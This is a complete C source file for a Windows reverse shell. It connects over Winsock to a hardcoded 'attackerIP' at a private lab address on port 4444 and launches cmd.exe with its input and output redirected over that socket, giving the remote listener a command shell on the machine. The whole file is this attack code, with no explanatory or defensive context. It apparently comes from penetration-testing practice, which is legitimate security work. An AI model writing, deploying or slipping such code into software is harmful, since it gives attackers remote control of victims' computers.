#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[]) {
    WSADATA socketData;
    SOCKET mainSocket;
    struct sockaddr_in connectionAddress;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;
    char *attackerIP = "192.168.88.163";
    short attackerPort = 4444;

    if (WSAStartup(MAKEWORD(2, 2), &socketData) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        return 1;
    }

    mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (mainSocket == INVALID_SOCKET) {
        printf("Socket creation failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    connectionAddress.sin_family = AF_INET;
    connectionAddress.sin_port = htons(attackerPort);
    connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

    if (WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("Connection failed with error: %d\n", WSAGetLastError());
        closesocket(mainSocket);
        WSACleanup();
        return 1;
    }

    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)mainSocket;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        closesocket(mainSocket);
        WSACleanup();
        return 1;
    }

    // Wait for the child process to terminate
    WaitForSingleObject(processInfo.hProcess, INFINITE);

    // Clean up
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    closesocket(mainSocket);
    WSACleanup();
    return 0;
}
